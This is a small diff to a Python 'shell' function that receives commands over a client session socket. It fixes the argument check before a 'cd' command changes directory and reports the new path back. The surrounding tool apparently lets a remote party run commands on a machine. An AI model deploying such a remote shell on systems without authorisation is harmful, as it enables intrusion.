@@ -33,7 +33,7 @@ def shell(client_session):
     while client_session.active and not client_session.closed:
         command = client_session.recv(1024).decode('utf-8').split(" ")
 
-        if command[0] == "cd" and len(command[1]):
+        if command[0] == "cd" and len(command)>1:
             path = " ".join(command[1:])
             os.chdir(path)
             client_session.send(f'Path changed to: {path}')
